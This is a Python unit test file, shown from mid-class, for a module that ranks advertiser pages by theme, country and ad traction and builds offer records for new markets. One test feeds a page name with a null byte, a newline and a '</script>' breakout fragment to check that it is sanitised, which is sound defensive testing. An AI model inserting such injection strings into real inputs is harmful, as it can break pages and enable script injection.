                with self.assertRaises(pm.ErrorValidacion) as ctx:
                    self.rank([p], [et(1)])
                self.assertIn(campo, str(ctx.exception))

    def test_valores_raros_son_error(self):
        malos = [
            ("anuncios float", {"anuncios_activos_en_muestra": 15.0}),
            ("anuncios bool", {"anuncios_activos_en_muestra": True}),
            ("anuncios 0", {"anuncios_activos_en_muestra": 0}),
            ("anuncios texto", {"anuncios_activos_en_muestra": "15"}),
            ("edad float", {"edad_oferta_dias": 10.0}),
            ("edad negativa", {"edad_oferta_dias": "-1"}),
            ("edad texto", {"edad_oferta_dias": "diez"}),
            ("edad NaN", {"edad_oferta_dias": "NaN"}),
            ("conceptos 0", {"conceptos_unicos": 0}),
            ("conceptos > anuncios", {"conceptos_unicos": 99}),
            ("truncada texto", {"muestra_truncada": "no"}),
            ("paises vacío", {"paises": []}),
            ("pais minúscula", {"paises": ["es"]}),
            ("page_id con letras", {"page_id": "abc"}),
            ("titulos no lista", {"titulos": "uno"}),
            ("titulos con número", {"titulos": ["a", 5]}),
            ("page_name número", {"page_name": 5}),
        ]
        for nombre, cambio in malos:
            with self.subTest(nombre):
                p = pg(1)
                p.update(cambio)
                with self.assertRaises(pm.ErrorValidacion):
                    self.rank([p], [et(1)])

    def test_page_id_repetido_es_error(self):
        with self.assertRaises(pm.ErrorValidacion):
            self.rank([pg(1), pg(1)], [et(1)])

    def test_documento_de_paginas_malformado_es_error(self):
        _, ed = docs([], [])
        for malo in (None, [], {"corrida_id": "2026-11-06-a"}, {"corrida_id": "mala", "paginas": []},
                     {"corrida_id": "2026-11-06-a", "paginas": {}}, {"corrida_id": "2026-11-06-a", "paginas": ["x"]}):
            with self.subTest(malo=malo), self.assertRaises(pm.ErrorValidacion):
                ranking.rankear(malo, ed, par_modelado=self.p, par_barrido=self.pb, ahora=AHORA)

    def test_acepta_enteros_decimal_y_page_id_entero(self):
        p = pg(1)
        p["page_id"] = int(pid(1))
        p["anuncios_activos_en_muestra"] = Decimal(20)
        p["edad_oferta_dias"] = Decimal("12.5")
        doc = self.rank([p], [et(1)])
        self.assertEqual(doc["temas"][0]["paginas"][0]["page_id"], pid(1))
        self.assertEqual(doc["temas"][0]["paginas"][0]["edad_oferta_dias"], "12.5")

    def test_sin_paginas_el_resultado_es_vacio_pero_valido(self):
        doc = self.rank([], [])
        self.assertEqual((doc["temas"], doc["descartadas"]), ([], []))
        self.assertEqual(doc["matriz_tema_pais"]["temas"], [])
        self.assertEqual(ranking.puente_a_fichas(doc, None, self.p)["ofertas"], [])

    def test_nombres_de_pagina_hostiles_se_limpian(self):
        doc = self.rank([pg(1, nombre="Línea1\nLínea2\x00 </script> " + "x" * 500)], [et(1)])
        nombre = doc["temas"][0]["paginas"][0]["page_name"]
        self.assertNotIn("\n", nombre)
        self.assertNotIn("\x00", nombre)
        self.assertLessEqual(len(nombre), 120)

    def test_page_name_none_es_aceptado(self):
        p = pg(1)
        p["page_name"] = None
        doc = self.rank([p], [et(1)])
        self.assertEqual(doc["temas"][0]["paginas"][0]["page_name"], "")


# ---------------------------------------------------------------------------
# es_oferta null (por verificar) y tema indeterminado (sin_tema)
# ---------------------------------------------------------------------------

def ind(n, *, formato="otro", es_oferta=None):
    """Etiqueta de tema «indeterminado» tal como la emite B4 (es_oferta y macro_nicho en null)."""
    return et(n, "indeterminado", formato=formato, macro=None, es_oferta=es_oferta, tema="indeterminado")


class PruebaSinTemaYPorVerificar(Base):
    # --- es_oferta_digital_pago_unico == null avanza (fail-open en descubrimiento) ---

    def test_null_avanza_a_candidata_y_queda_por_verificar(self):
        doc = self.rank([pg(1, paises=["US"]), pg(2, paises=["ES"])], [et(1, es_oferta=None), et(2, "tema-b")])
        tema = self.tema(doc, "tema-a")
        pagina = tema["paginas"][0]
        self.assertIsNone(pagina["es_oferta_digital_pago_unico"])
        self.assertEqual(pagina["por_verificar"], ["modelo_de_cobro"])
        self.assertEqual(tema["por_verificar"], ["modelo_de_cobro"])
        self.assertEqual(tema["paginas_por_verificar"], 1)
        self.assertEqual(doc["resumen"]["paginas_por_verificar"], 1)
        self.assertEqual(self.motivos_de(doc), {})  # nada se descartó
        self.assertTrue(any("es_oferta_digital_pago_unico = null" in a and "por_verificar" in a
                            for a in doc["advertencias"]))

    @staticmethod
    def motivos_de(doc):
        return {d["page_id"]: d["motivos"] for d in doc["descartadas"]}

    def test_true_no_queda_por_verificar(self):
        doc = self.rank([pg(1)], [et(1, es_oferta=True)])
        tema = doc["temas"][0]
        self.assertEqual((tema["por_verificar"], tema["paginas_por_verificar"]), ([], 0))
        self.assertEqual(tema["paginas"][0]["por_verificar"], [])
        self.assertIs(tema["paginas"][0]["es_oferta_digital_pago_unico"], True)
        self.assertFalse(any("por_verificar" in a for a in doc["advertencias"]))

    def test_un_tema_con_true_y_null_se_marca_por_verificar_solo_por_la_pagina_null(self):
        doc = self.rank([pg(1), pg(2)], [et(1, es_oferta=True), et(2, es_oferta=None)])
        tema = doc["temas"][0]
        self.assertEqual((tema["por_verificar"], tema["paginas_por_verificar"]), (["modelo_de_cobro"], 1))
        self.assertEqual([p["por_verificar"] for p in tema["paginas"]], [[], ["modelo_de_cobro"]])

    def test_null_cuenta_para_el_tema_y_para_los_anunciantes_independientes(self):
        doc = self.rank([pg(1), pg(2), pg(3)], [et(1, es_oferta=True), et(2, es_oferta=None), et(3, es_oferta=None)])
        self.assertEqual(doc["temas"][0]["anunciantes_independientes"], 3)

    def test_la_traccion_de_una_pagina_null_se_mide_igual(self):
        doc = self.rank([pg(1, anuncios=14, edad="10"), pg(2, anuncios=15, edad="10", conceptos=2)],
                        [et(1, "tema-a", es_oferta=None), et(2, "tema-b", es_oferta=None)])
        self.assertEqual(self.tema(doc, "tema-a")["estado_traccion"], "no_pasa")
        self.assertEqual(self.tema(doc, "tema-b")["estado_traccion"], "pasa")

    def test_la_ficha_de_una_pagina_null_lo_declara_en_pendiente_y_sigue_incompleta(self):
        doc = self.rank([pg(1, paises=["US"]), pg(2, paises=["ES"])], [et(1, es_oferta=None), et(2, "tema-b")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = fichas["ofertas"][0]
        pend = [x for x in o["pendiente"] if x.startswith("es_oferta_digital_pago_unico")]
        self.assertEqual(len(pend), 1)
        self.assertIn("modelo de cobro", pend[0])
        self.assertEqual({x["estado"] for x in pm.puntuar(fichas, self.p)}, {"incompleta"})
        pm.validar_fichas(fichas, self.p)

    def test_la_ficha_de_una_pagina_true_no_lleva_ese_pendiente(self):
        doc = self.rank([pg(1, paises=["US"]), pg(2, paises=["ES"])], [et(1, es_oferta=True), et(2, "tema-b")])
        o = ranking.puente_a_fichas(doc, None, self.p)["ofertas"][0]
        self.assertFalse(any(x.startswith("es_oferta_digital_pago_unico") for x in o["pendiente"]))

    def test_en_el_fixture_la_pagina_64_con_null_avanza_y_tiene_ficha_por_verificar(self):
        doc = self.rank_fix()
        self.assertEqual(self.pagina(doc, 64)["por_verificar"], ["modelo_de_cobro"])
        o = next(x for x in ranking.puente_a_fichas(doc, None, self.p)["ofertas"] if x["modelo_id"].endswith(pid(64)))
        self.assertTrue(any(x.startswith("es_oferta_digital_pago_unico") for x in o["pendiente"]))

    # --- tema indeterminado: avanza como «sin_tema», sin agruparse por tema ---

    def test_indeterminado_con_alta_traccion_avanza_como_sin_tema(self):
        doc = self.rank([pg(1, anuncios=30, edad="20", paises=["US"]), pg(2, paises=["ES"])], [ind(1), et(2, "tema-b")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-b"])  # no existe un tema «indeterminado»
        self.assertEqual(len(doc["sin_tema"]), 1)
        r = doc["sin_tema"][0]
        self.assertEqual((r["rank"], r["page_id"], r["tema_slug"]), (1, pid(1), "indeterminado"))
        self.assertEqual(r["estado_traccion"], "pasa")
        self.assertEqual(r["por_verificar"], ["tema", "modelo_de_cobro"])
        self.assertIsNone(r["es_oferta_digital_pago_unico"])
        self.assertEqual(r["huecos"], ["ES"])  # el hueco es el del original solo
        self.assertEqual(doc["descartadas"], [])
        self.assertTrue(any("sin_tema" in a for a in doc["advertencias"]))

    def test_indeterminado_no_aparece_en_la_matriz_ni_en_exportadores_por_tema(self):
        pd, ed = docs([pg(1, anuncios=30, edad="20"), pg(2, paises=["ES"])], [ind(1), et(2, "tema-b")])
        m = ranking.matriz_tema_pais(pd, ed)
        self.assertEqual([f["tema_slug"] for f in m["temas"]], ["tema-b"])
        e = ranking.exportadores_por_tema(pd, ed)
        self.assertEqual([f["tema_slug"] for f in e["temas"]], ["tema-b"])
        self.assertEqual(m["paises"], ["ES", "US"])  # pero su país sí cuenta como barrido

    def test_indeterminadas_distintas_no_se_agrupan_en_un_tema(self):
        doc = self.rank([pg(1, titulos=["A", "B"], conceptos=2), pg(2, titulos=["C", "D"], conceptos=2),
                         pg(3, titulos=["E", "F"], conceptos=2)], [ind(1), ind(2), ind(3)])
        self.assertEqual(doc["temas"], [])
        self.assertEqual(len(doc["sin_tema"]), 3)
        self.assertEqual([r["cuenta_como_independiente"] for r in doc["sin_tema"]], [True, True, True])
        self.assertEqual({r["paginas_en_grupo"] for r in doc["sin_tema"]}, {1})

    def test_indeterminadas_con_los_mismos_titulos_son_un_solo_operador(self):
        doc = self.rank([pg(1, anuncios=30, titulos=["A", "B"], conceptos=2),
                         pg(2, anuncios=20, titulos=["a", "b"], conceptos=2)], [ind(1), ind(2)])
        self.assertEqual([r["page_id"] for r in doc["sin_tema"]], [pid(1), pid(2)])
        self.assertEqual([r["cuenta_como_independiente"] for r in doc["sin_tema"]], [True, False])
        self.assertEqual({r["paginas_en_grupo"] for r in doc["sin_tema"]}, {2})
        self.assertTrue(all(r["posible_mismo_operador"] for r in doc["sin_tema"]))

    def test_indeterminado_con_traccion_definitivamente_baja_se_descarta_con_motivo(self):
        doc = self.rank([pg(1, anuncios=14, edad="30", conceptos=2), pg(2, anuncios=30, edad="9.99")],
                        [ind(1), ind(2)])
        self.assertEqual(doc["sin_tema"], [])
        self.assertEqual(self.motivos_de(doc), {pid(1): ["tema_indeterminado_sin_traccion_alta"],
                                                pid(2): ["tema_indeterminado_sin_traccion_alta"]})
        d = doc["descartadas"][0]
        self.assertEqual((d["tema_slug"], d["page_name"], d["anuncios_activos_en_muestra"]), ("indeterminado", "Página 1", 14))
        self.assertEqual(doc["resumen"]["descartadas_por_motivo"], {"tema_indeterminado_sin_traccion_alta": 2})

    def test_borde_exacto_15_y_10_avanza_como_sin_tema(self):
        doc = self.rank([pg(1, anuncios=15, edad="10", conceptos=2)], [ind(1)])
        self.assertEqual([r["estado_traccion"] for r in doc["sin_tema"]], ["pasa"])

    def test_indeterminado_con_muestra_truncada_bajo_el_umbral_nunca_se_descarta(self):
        for anuncios, edad in ((1, "0"), (5, "2"), (14, "9.99"), (20, "3")):
            with self.subTest(anuncios=anuncios, edad=edad):
                doc = self.rank([pg(1, anuncios=anuncios, edad=edad, conceptos=1, trunc=True)], [ind(1)])
                self.assertEqual(self.motivos_de(doc), {})
                self.assertEqual([r["estado_traccion"] for r in doc["sin_tema"]], ["indeterminada_por_muestra"])
                self.assertIsNone(doc["sin_tema"][0]["pasa_traccion"])
                self.assertEqual(ranking.puente_a_fichas(doc, None, self.p)["ofertas"], [])  # sin ficha hasta medir

    def test_indeterminado_con_formato_excluido_o_false_no_avanza(self):
        for formato, es_oferta, motivo in (("servicio", None, "formato_excluido:servicio"),
                                           ("comunidad_o_app", None, "formato_excluido:comunidad_o_app"),
                                           ("otro", False, "no_es_oferta_digital_pago_unico")):
            with self.subTest(formato=formato, es_oferta=es_oferta):
                doc = self.rank([pg(1, anuncios=40, edad="30")], [ind(1, formato=formato, es_oferta=es_oferta)])
                self.assertEqual(doc["sin_tema"], [])
                self.assertEqual(self.motivos_de(doc), {pid(1): [motivo]})

    def test_sin_tema_ordena_primero_los_que_pasan_y_luego_por_anuncios_edad_e_id(self):
        doc = self.rank([pg(1, anuncios=16, edad="12", conceptos=2), pg(2, anuncios=40, edad="12", conceptos=2),
                         pg(3, anuncios=40, edad="12", conceptos=2), pg(4, anuncios=50, edad="3", conceptos=2, trunc=True),
                         pg(5, anuncios=40, edad="20", conceptos=2)], [ind(n) for n in range(1, 6)])
        self.assertEqual([r["page_id"] for r in doc["sin_tema"]], [pid(5), pid(2), pid(3), pid(1), pid(4)])
        self.assertEqual([r["rank"] for r in doc["sin_tema"]], [1, 2, 3, 4, 5])
        self.assertEqual(doc["sin_tema"][-1]["estado_traccion"], "indeterminada_por_muestra")

    def test_fixture_sin_tema(self):
        doc = self.rank_fix()
        self.assertEqual([(r["page_id"], r["estado_traccion"], r["cuenta_como_independiente"], r["paginas_en_grupo"])
                          for r in doc["sin_tema"]],
                         [(pid(68), "pasa", True, 2), (pid(71), "pasa", False, 2),
                          (pid(70), "indeterminada_por_muestra", True, 1)])
        self.assertEqual(self.motivos_de(doc)[pid(69)], ["tema_indeterminado_sin_traccion_alta"])
        self.assertNotIn("indeterminado", [t["tema_slug"] for t in doc["temas"]])
        self.assertNotIn("indeterminado", json.dumps(doc["matriz_tema_pais"]))

    def test_el_resumen_cuadra_con_sin_tema(self):
        r = self.rank_fix()["resumen"]
        self.assertEqual(r["paginas_candidatas"], r["paginas_en_temas"] + r["paginas_sin_tema"])
        self.assertEqual(r["descartadas_por_motivo"]["tema_indeterminado_sin_traccion_alta"], 1)

    # --- fichas de las páginas sin tema ---

    def test_ficha_de_una_pagina_sin_tema(self):
        doc = self.rank_fix()
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        o = next(x for x in fichas["ofertas"] if x["modelo_id"].startswith("sin-tema-"))
        self.assertEqual(o["modelo_id"], "sin-tema-misterio-alto-" + pid(68))
        self.assertTrue(o["nombre"].startswith("Sin tema · Misterio Alto"))
        self.assertEqual(o["fuente"], {"idioma": "en", "pais": "US"})
        self.assertEqual([m["mercado"] for m in o["mercados"]], ["BR", "ES", "IT", "MX"])  # universo − {US}
        self.assertEqual(o["traccion"], {"anuncios_activos": 30, "edad_oferta_dias": "20", "conceptos_unicos": 3,
                                         "paginas_misma_landing": 2, "anunciantes_independientes_mismo_angulo": 0})
        self.assertIsNone(o["macro_nicho"])
        texto = " | ".join(o["pendiente"])
        for esperado in ("tema_indeterminado", "es_oferta_digital_pago_unico", "puertas", "entrantes_30d"):
            self.assertIn(esperado, texto)
        self.assertEqual(tuple(o["puertas"]), PUERTAS_VIGENTES)
        self.assertTrue(all(v is None for v in o["puertas"].values()))
        self.assertEqual({x["estado"] for x in pm.puntuar(fichas, self.p)}, {"incompleta"})

    def test_solo_el_representante_del_clon_sin_tema_tiene_ficha_y_la_truncada_no(self):
        ids = [o["modelo_id"] for o in ranking.puente_a_fichas(self.rank_fix(), None, self.p)["ofertas"]
               if o["modelo_id"].startswith("sin-tema-")]
        self.assertEqual(ids, ["sin-tema-misterio-alto-" + pid(68)])

    def test_los_entrantes_de_una_pagina_sin_tema_se_buscan_por_page_id(self):
        doc = self.rank_fix(memoria_diff=cargar("memoria_b3_ok.json"))
        self.assertEqual(doc["sin_tema"][0]["entrantes_30d"], {"BR": 3, "ES": 0, "IT": 0, "MX": 1})
        o = next(x for x in ranking.puente_a_fichas(doc, None, self.p)["ofertas"] if x["modelo_id"].startswith("sin-tema-"))
        self.assertEqual({m["mercado"]: m["hueco"]["entrantes_30d"] for m in o["mercados"]},
                         {"BR": 3, "ES": 0, "IT": 0, "MX": 1})
        self.assertFalse(any(x.startswith("entrantes_30d") for x in o["pendiente"]))
        sin = ranking.puente_a_fichas(self.rank_fix(), None, self.p)
        o = next(x for x in sin["ofertas"] if x["modelo_id"].startswith("sin-tema-"))
        self.assertTrue(all(m["hueco"]["entrantes_30d"] is None for m in o["mercados"]))

    def test_sin_tema_sin_mercado_destino_no_genera_ficha(self):
        doc = self.rank([pg(1, anuncios=30, edad="20", paises=["US", "ES"])], [ind(1)])
        f = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(f["ofertas"], [])
        self.assertIn("sin_mercado_destino_con_ausencia", f["_nota"])

    def test_candidatos_antiguos_sin_la_clave_sin_tema_siguen_funcionando(self):
        doc = self.rank_fix()
        del doc["sin_tema"]
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        self.assertEqual(len(fichas["ofertas"]), 6)
        pm.validar_fichas(fichas, self.p)

    def test_las_pruebas_fallan_si_se_reintroduce_el_descarte_de_los_null(self):
        # canario: si es_oferta null volviera a descartar, no habría ningún tema con página por verificar
        doc = self.rank([pg(1)], [et(1, es_oferta=None)])
        self.assertEqual(len(doc["temas"]), 1)
        self.assertEqual(doc["resumen"]["paginas_descartadas"], 0)
        self.assertNotIn("oferta_digital_pago_unico_sin_determinar", json.dumps(self.rank_fix()))


# ---------------------------------------------------------------------------
# Tracción con la medición de la pasada 3 (medicion, anuncios_activos_medidos, edad_es_piso)
# ---------------------------------------------------------------------------

class PruebaTraccionMedida(Base):
    def estado(self, pagina):
        doc = self.rank([pagina], [et(1)])
        return doc["temas"][0]["paginas"][0]

    # umbrales reales: 15 anuncios y 10 días
    RAMAS = [
        # (descripción, estado, medidos, edad, edad_piso, estado esperado, detalle anuncios, detalle edad)
        ("1 cumple ambos, completa", "completa", 20, "12", False, "pasa", "cumple", "cumple"),
        ("1 borde exacto 15 y 10, completa", "completa", 15, "10", False, "pasa", "cumple", "cumple"),
        ("1 piso que ya supera ambos es definitivo", "parcial", 15, "10", True, "pasa", "cumple", "cumple"),
        ("1 piso muy por encima", "muestra", 90, "30", True, "pasa", "cumple", "cumple"),
        ("2 anuncios bien, edad corta y edad piso", "parcial", 40, "4", True, "indeterminada_por_muestra", "cumple", "indeterminada"),
        ("2 borde: 15 anuncios, edad 9.99 y piso", "muestra", 15, "9.99", True, "indeterminada_por_muestra", "cumple", "indeterminada"),
        ("2 anuncios bien, edad corta y edad exacta", "completa", 40, "4", False, "no_pasa", "cumple", "no_cumple"),
        ("2 borde: 15 anuncios, edad 9.99 exacta", "completa", 15, "9.99", False, "no_pasa", "cumple", "no_cumple"),
        ("3 completa con 14 anuncios", "completa", 14, "30", False, "no_pasa", "no_cumple", "cumple"),
        ("3 completa con pocos anuncios y poca edad", "completa", 3, "1", False, "no_pasa", "no_cumple", "no_cumple"),
        ("3 parcial con 14 (piso insuficiente)", "parcial", 14, "30", True, "indeterminada_por_muestra", "indeterminada", "cumple"),
        ("3 solo muestra con 3 anuncios", "muestra", 3, "1", True, "indeterminada_por_muestra", "indeterminada", "indeterminada"),
        ("3 parcial con 0 medidos", "parcial", 0, "0", True, "indeterminada_por_muestra", "indeterminada", "indeterminada"),
    ]

    def test_cada_rama_de_la_regla(self):
        for desc, estado, medidos, edad, edad_piso, esperado, da, de in self.RAMAS:
            with self.subTest(desc):
                # 0 medidos con una página vista en la muestra es incoherente: se sube a los conceptos vistos (M2)
                r = self.estado(med(1, estado, medidos, edad, edad_piso=edad_piso, conceptos=min(2, max(medidos, 1))))
                self.assertEqual(r["estado_traccion"], esperado)
                self.assertEqual(r["traccion_detalle"], {"anuncios": da, "edad": de})
                self.assertEqual(r["regla_traccion"], "medida")
                self.assertIs(r["pasa_traccion"], {"pasa": True, "no_pasa": False}.get(esperado))

    def test_nunca_se_descarta_por_un_conteo_que_es_piso_e_insuficiente(self):
        for estado in ("parcial", "muestra"):
            for medidos in (1, 2, 5, 14, 15, 40):
                for edad in ("0", "3", "9.99", "10", "30"):
                    with self.subTest(estado=estado, medidos=medidos, edad=edad):
                        r = self.estado(med(1, estado, medidos, edad, edad_piso=True, conceptos=1))
                        self.assertNotEqual(r["estado_traccion"], "no_pasa")

    def test_con_medicion_completa_el_resultado_es_siempre_definitivo(self):
        for medidos in (1, 14, 15, 40):
            for edad in ("0", "9.99", "10", "30"):
                with self.subTest(medidos=medidos, edad=edad):
                    r = self.estado(med(1, "completa", medidos, edad, edad_piso=False, conceptos=1))
                    self.assertIn(r["estado_traccion"], ("pasa", "no_pasa"))
                    self.assertEqual(r["estado_traccion"] == "pasa", medidos >= 15 and Decimal(edad) >= 10)

    def test_edad_exacta_insuficiente_descarta_aunque_el_conteo_sea_piso(self):
        # esquina: la edad es exacta (no es piso) y no llega: ningún conteo posterior puede arreglarlo
        r = self.estado(med(1, "parcial", 10, "4", edad_piso=False, conceptos=1))
        self.assertEqual(r["estado_traccion"], "no_pasa")
        self.assertEqual(r["traccion_detalle"], {"anuncios": "indeterminada", "edad": "no_cumple"})

    def test_usa_los_anuncios_medidos_y_no_los_de_la_muestra(self):
        # la muestra vio 5 anuncios pero la página tiene 40 activos: pasa
        r = self.estado(med(1, "parcial", 40, "12", anuncios=5, conceptos=2, edad_piso=True))
        self.assertEqual((r["anuncios_activos_en_muestra"], r["anuncios_activos_medidos"]), (5, 40))
        self.assertEqual(r["estado_traccion"], "pasa")
        # la muestra vio 50 pero la medición completa dice 12: no pasa
        r = self.estado(med(1, "completa", 12, "12", anuncios=12, conceptos=2, edad_piso=False))
        self.assertEqual((r["estado_traccion"], r["anuncios_activos_traccion"]), ("no_pasa", 12))

    def test_el_umbral_sale_de_los_parametros(self):
        pagina = med(1, "completa", 16, "12", edad_piso=False)
        mas_exigente = dict(self.p, modelado_anuncios_objetivo=20)
        self.assertEqual(self.rank([pagina], [et(1)], par_modelado=mas_exigente)["temas"][0]["estado_traccion"], "no_pasa")
        mas_exigente = dict(self.p, modelado_dias_objetivo=Decimal(13))
        self.assertEqual(self.rank([pagina], [et(1)], par_modelado=mas_exigente)["temas"][0]["estado_traccion"], "no_pasa")
        self.assertEqual(self.rank([pagina], [et(1)])["temas"][0]["estado_traccion"], "pasa")

    def test_corridas_viejas_sin_medicion_caen_a_la_regla_de_la_muestra(self):
        for kw, esperado in (({"anuncios": 15, "edad": "10"}, "pasa"), ({"anuncios": 14, "edad": "10"}, "no_pasa"),
                             ({"anuncios": 3, "edad": "1", "trunc": True}, "indeterminada_por_muestra")):
            with self.subTest(kw=kw):
                r = self.estado(pg(1, conceptos=1, **kw))
                self.assertEqual(r["estado_traccion"], esperado)
                self.assertEqual(r["regla_traccion"], "muestra")
                self.assertIsNone(r["anuncios_activos_medidos"])
                self.assertEqual(r["anuncios_activos_traccion"], kw["anuncios"])
                self.assertEqual(r["paises_ausencia_medida"], [])

    def test_medicion_incompleta_cae_a_la_regla_de_la_muestra_y_avisa(self):
        incompletas = [
            {"anuncios_activos_medidos": 40},
            {"anuncios_activos_medidos": 40, "edad_es_piso": True},
            {"medicion": {"estado": "parcial", "por_pais": {}}, "edad_es_piso": True},
            {"medicion": {"estado": "parcial", "por_pais": {}}, "anuncios_activos_medidos": 40},
            {"edad_es_piso": True},
        ]
        for extra in incompletas:
            with self.subTest(extra=sorted(extra)):
                pagina = pg(1, anuncios=20, edad="12", conceptos=2)
                pagina.update(extra)
                doc = self.rank([pagina], [et(1)])
                r = doc["temas"][0]["paginas"][0]
                self.assertEqual(r["regla_traccion"], "muestra")
                self.assertEqual(r["estado_traccion"], "pasa")
                self.assertTrue(any("medición incompletos" in a for a in doc["advertencias"]))

    def test_campos_de_medicion_raros_son_error(self):
        malos = [
            ("estado desconocido", lambda p: p["medicion"].update(estado="casi")),
            ("medidos float", lambda p: p.update(anuncios_activos_medidos=20.0)),
            ("medidos bool", lambda p: p.update(anuncios_activos_medidos=True)),
            ("medidos negativo", lambda p: p.update(anuncios_activos_medidos=-1)),
            ("edad_es_piso texto", lambda p: p.update(edad_es_piso="si")),
            ("medidos_es_piso texto", lambda p: p.update(anuncios_activos_medidos_es_piso="si")),
            ("por_pais lista", lambda p: p["medicion"].update(por_pais=[])),
            ("por_pais país minúscula", lambda p: p["medicion"].update(por_pais=por_pais(es=("pagina", 1, 1, True)))),
            ("por_pais sin fuente", lambda p: p["medicion"].update(por_pais={"ES": {"anuncios_vistos": 1, "total_declarado": 1, "completa": True}})),
            ("por_pais fuente rara", lambda p: p["medicion"].update(por_pais=por_pais(ES=("web", 1, 1, True)))),
            ("por_pais completa texto", lambda p: p["medicion"].update(por_pais=por_pais(ES=("pagina", 1, 1, "si")))),
            ("por_pais vistos float", lambda p: p["medicion"].update(por_pais=por_pais(ES=("pagina", 1.5, 1, True)))),
            ("por_pais total negativo", lambda p: p["medicion"].update(por_pais=por_pais(ES=("pagina", 1, -1, True)))),
            ("por_pais valor no objeto", lambda p: p["medicion"].update(por_pais={"ES": 3})),
        ]
        for nombre, rompe in malos:
            with self.subTest(nombre):
                pagina = med(1, "parcial", 20, "12", conceptos=2)
                rompe(pagina)
                with self.assertRaises(pm.ErrorValidacion):
                    self.rank([pagina], [et(1)])

    def test_total_declarado_nulo_es_valido(self):
        pagina = med(1, "parcial", 20, "12", por_pais=por_pais(ES=("muestra", 20, None, False)))
        self.assertEqual(self.estado(pagina)["estado_traccion"], "pasa")

    # --- tema, ranking y resumen ---

    def test_el_tema_pasa_si_una_pagina_pasa_y_es_indeterminado_si_solo_hay_pisos(self):
        doc = self.rank([med(1, "completa", 5, "20", edad_piso=False, conceptos=1),
                         med(2, "parcial", 30, "3", conceptos=1)], [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["estado_traccion"], "indeterminada_por_muestra")
        doc = self.rank([med(1, "completa", 5, "20", edad_piso=False, conceptos=1),
                         med(2, "completa", 30, "40", edad_piso=False, conceptos=1)], [et(1), et(2)])
        self.assertEqual(doc["temas"][0]["estado_traccion"], "pasa")
        self.assertEqual(doc["temas"][0]["edad_oferta_dias"], "40")  # la mayor entre las páginas con tracción

    def test_el_orden_usa_los_anuncios_medidos(self):
        doc = self.rank([med(1, "parcial", 80, "12", anuncios=20, edad_piso=True), med(2, "parcial", 30, "12", anuncios=30, edad_piso=True)],
                        [et(1, "tema-a"), et(2, "tema-b")])
        self.assertEqual([t["tema_slug"] for t in doc["temas"]], ["tema-a", "tema-b"])
        self.assertEqual(doc["temas"][0]["anuncios_activos_traccion"], 80)
        self.assertEqual(doc["temas"][0]["anuncios_activos_en_muestra"], 20)

    def test_resumen_por_medicion_y_por_estado(self):
        paginas = [med(1, "completa", 20, "12", edad_piso=False), med(2, "parcial", 40, "4"),
                   med(3, "muestra", 3, "1", conceptos=1), med(4, "completa", 5, "3", edad_piso=False, conceptos=1),
                   pg(5, anuncios=20, edad="12")]
        doc = self.rank(paginas, [et(n, f"tema-{n}") for n in range(1, 6)])
        r = doc["resumen"]
        self.assertEqual(r["paginas_por_medicion"], {"completa": 2, "parcial": 1, "muestra": 1, "sin_medicion": 1})
        self.assertEqual(r["paginas_candidatas_por_estado"], {"pasa": 2, "indeterminada_por_muestra": 2, "no_pasa": 1})
        self.assertTrue(any("medición de la pasada 3" in a and "PISO" in a for a in doc["advertencias"]))

    def test_sin_ninguna_medicion_el_resumen_no_cambia_de_sentido(self):
        r = self.rank_fix()["resumen"]
        self.assertEqual(r["paginas_por_medicion"], {"completa": 0, "parcial": 0, "muestra": 0, "sin_medicion": 23})

    # --- países medidos ---

    def test_la_pasada_3_amplia_el_universo_y_marca_la_ausencia_medida(self):
        pp = por_pais(ES=("pagina", 20, 20, True), MX=("pagina", 0, 0, True), BR=("muestra", 0, None, False),
                      IT=("pagina", 0, 0, False))
        doc = self.rank([med(1, "completa", 20, "12", edad_piso=False, por_pais=pp, paises=["ES"])], [et(1)])
        r = doc["temas"][0]
        self.assertEqual(doc["matriz_tema_pais"]["paises"], ["BR", "ES", "IT", "MX"])
        self.assertEqual(r["huecos"], ["BR", "IT", "MX"])
        self.assertEqual(r["paginas"][0]["paises_ausencia_medida"], ["MX"])  # solo si completa y total_declarado 0

    def test_la_ficha_distingue_ausencia_medida_de_ausencia_en_la_muestra(self):
        pp = por_pais(ES=("pagina", 20, 20, True), MX=("pagina", 0, 0, True), BR=("muestra", 0, None, False))
        doc = self.rank([med(1, "completa", 20, "12", edad_piso=False, por_pais=pp, paises=["ES"])], [et(1)])
        o = ranking.puente_a_fichas(doc, None, self.p)["ofertas"][0]
        notas = {m["mercado"]: m["_nota"] for m in o["mercados"]}
        self.assertIn("NO corre aquí", notas["MX"])
        self.assertIn("declaró 0", notas["MX"])
        self.assertIn("Ausencia en la MUESTRA", notas["BR"])
        for m in o["mercados"]:  # el hueco sigue siendo el mismo de la ficha: nada se asume
            self.assertEqual(m["hueco"]["original_presente"], False)
            self.assertEqual(m["hueco"]["anunciantes_sostenidos"], 0)

    # --- ficha ---

    def ficha(self, pagina, otra=None):
        paginas = [pagina] + ([otra] if otra else [pg(9, paises=["US"], anuncios=2, edad="1", conceptos=1)])
        doc = self.rank(paginas, [et(1), et(9, "tema-z")])
        fichas = ranking.puente_a_fichas(doc, None, self.p)
        return fichas, next(o for o in fichas["ofertas"] if o["modelo_id"].endswith(pid(1)))

    def test_la_ficha_usa_los_anuncios_medidos_y_pasa_el_validador_real(self):
        fichas, o = self.ficha(med(1, "parcial", 120, "14.9", anuncios=50, conceptos=3, edad_piso=True))
        self.assertEqual(o["traccion"]["anuncios_activos"], 120)
        self.assertEqual(o["traccion"]["edad_oferta_dias"], "14.9")
        validadas = pm.validar_fichas(copy.deepcopy(fichas), self.p)
        self.assertEqual(validadas[0]["traccion"]["anuncios_activos"], 120)
        self.assertEqual({x["estado"] for x in pm.puntuar(fichas, self.p)}, {"incompleta"})

    def test_la_ficha_declara_el_piso_en_pendiente(self):
        _, o = self.ficha(med(1, "parcial", 120, "14.9", anuncios=50, conceptos=3, edad_piso=True))
        texto = " | ".join(o["pendiente"])
        self.assertIn("traccion.anuncios_activos es un PISO (medición parcial)", texto)
        self.assertIn("traccion.edad_oferta_dias es un PISO", texto)

    def test_la_ficha_de_una_medicion_completa_no_declara_piso(self):
        _, o = self.ficha(med(1, "completa", 20, "12", conceptos=3, edad_piso=False))
        texto = " | ".join(o["pendiente"])
        self.assertNotIn("PISO", texto)
